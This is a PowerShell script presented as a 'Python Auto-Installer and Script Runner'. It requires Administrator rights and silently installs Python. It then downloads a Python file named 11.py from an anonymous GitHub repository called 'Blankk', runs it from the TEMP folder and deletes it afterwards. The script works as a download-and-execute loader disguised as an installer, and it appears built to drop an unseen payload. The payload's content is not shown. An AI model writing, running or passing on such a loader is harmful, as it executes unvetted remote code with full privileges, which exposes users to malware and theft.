# Python Auto-Installer and Script Runner
# Requires Administrator privileges

param(
    [string]$PythonScriptUrl = "https://raw.githubusercontent.com/gabid4755-wq/Blankk/main/11.py",
    [string]$DownloadPath = "$env:TEMP\downloaded_script.py",
    [string]$PythonVersion = "3.11.4"
)

# Function to check if running as Administrator
function Test-Admin {
    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

# Function to download file
function Invoke-DownloadFile {
    param([string]$Url, [string]$OutputPath)
    
    try {
        Write-Host "Downloading Python script from GitHub..." -ForegroundColor Yellow
        $webClient = New-Object System.Net.WebClient
        $webClient.DownloadFile($Url, $OutputPath)
        Write-Host "Download completed successfully." -ForegroundColor Green
        return $true
    }
    catch {
        Write-Host "Error downloading file: $_" -ForegroundColor Red
        return $false
    }
}

# Function to check if Python is installed
function Test-PythonInstalled {
    try {
        # Check if python is in PATH
        $pythonVersion = python --version 2>&1
        if ($LASTEXITCODE -eq 0) {
            Write-Host "Python found: $pythonVersion" -ForegroundColor Green
            return $true
        }
    }
    catch {
        # Python not in PATH, check common installation locations
        $commonPaths = @(
            "$env:LOCALAPPDATA\Programs\Python\Python*",
            "$env:ProgramFiles\Python*",
            "$env:ProgramFiles(x86)\Python*"
        )
        
        foreach ($path in $commonPaths) {
            if (Test-Path $path) {
                $pythonDirs = Get-ChildItem $path -Directory | Sort-Object Name -Descending
                if ($pythonDirs) {
                    $pythonExe = Join-Path $pythonDirs[0].FullName "python.exe"
                    if (Test-Path $pythonExe) {
                        Write-Host "Python found at: $pythonExe" -ForegroundColor Green
                        $env:Path += ";$($pythonDirs[0].FullName)"
                        return $true
                    }
                }
            }
        }
        return $false
    }
    return $false
}

# Function to install Python
function Install-Python {
    param([string]$Version = "3.11.4")
    
    Write-Host "Python not found. Installing Python $Version..." -ForegroundColor Yellow
    
    $installerUrl = "https://www.python.org/ftp/python/$Version/python-$Version-amd64.exe"
    $installerPath = "$env:TEMP\python-installer.exe"
    
    # Download Python installer
    if (-not (Invoke-DownloadFile -Url $installerUrl -OutputPath $installerPath)) {
        Write-Host "Failed to download Python installer." -ForegroundColor Red
        return $false
    }
    
    # Install Python silently
    Write-Host "Installing Python $Version..." -ForegroundColor Yellow
    $installArgs = @(
        "/quiet",
        "InstallAllUsers=1",
        "PrependPath=1",
        "Include_test=0",
        "SimpleInstall=1"
    )
    
    $process = Start-Process -FilePath $installerPath -ArgumentList $installArgs -Wait -PassThru
    
    if ($process.ExitCode -eq 0) {
        Write-Host "Python installed successfully." -ForegroundColor Green
        
        # Refresh environment variables
        $env:Path = [System.Environment]::GetEnvironmentVariable("Path", "Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path", "User")
        
        # Verify installation
        Start-Sleep -Seconds 5
        return Test-PythonInstalled
    }
    else {
        Write-Host "Python installation failed with exit code: $($process.ExitCode)" -ForegroundColor Red
        return $false
    }
}

# Function to execute Python script
function Invoke-PythonScript {
    param([string]$ScriptPath)
    
    try {
        Write-Host "Executing Python script..." -ForegroundColor Yellow
        $output = python $ScriptPath 2>&1
        Write-Host "Script output:" -ForegroundColor Cyan
        Write-Host $output -ForegroundColor White
        Write-Host "Python script execution completed." -ForegroundColor Green
        return $true
    }
    catch {
        Write-Host "Error executing Python script: $_" -ForegroundColor Red
        return $false
    }
}

# Main execution block
function Main {
    Write-Host "=== Python Auto-Installer and Script Runner ===" -ForegroundColor Cyan
    Write-Host "Starting process..." -ForegroundColor Yellow
    
    # Check if running as Administrator
    if (-not (Test-Admin)) {
        Write-Host "This script requires Administrator privileges." -ForegroundColor Red
        Write-Host "Please run PowerShell as Administrator and execute this script again." -ForegroundColor Yellow
        pause
        exit 1
    }
    
    Write-Host "Running with Administrator privileges." -ForegroundColor Green
    
    # Check and install Python if needed
    if (-not (Test-PythonInstalled)) {
        Write-Host "Python is not installed." -ForegroundColor Yellow
        if (-not (Install-Python -Version $PythonVersion)) {
            Write-Host "Failed to install Python. Exiting." -ForegroundColor Red
            exit 1
        }
    }
    
    # Download Python script
    if (-not (Invoke-DownloadFile -Url $PythonScriptUrl -OutputPath $DownloadPath)) {
        Write-Host "Failed to download Python script. Exiting." -ForegroundColor Red
        exit 1
    }
    
    # Verify the downloaded file exists
    if (-not (Test-Path $DownloadPath)) {
        Write-Host "Downloaded file not found. Exiting." -ForegroundColor Red
        exit 1
    }
    
    # Execute Python script
    if (-not (Invoke-PythonScript -ScriptPath $DownloadPath)) {
        Write-Host "Script execution failed." -ForegroundColor Red
        exit 1
    }
    
    # Cleanup (optional)
    Write-Host "Cleaning up temporary files..." -ForegroundColor Yellow
    if (Test-Path $DownloadPath) {
        Remove-Item $DownloadPath -Force
        Write-Host "Cleanup completed." -ForegroundColor Green
    }
    
    Write-Host "=== Process completed successfully ===" -ForegroundColor Cyan
}

# Execute main function
Main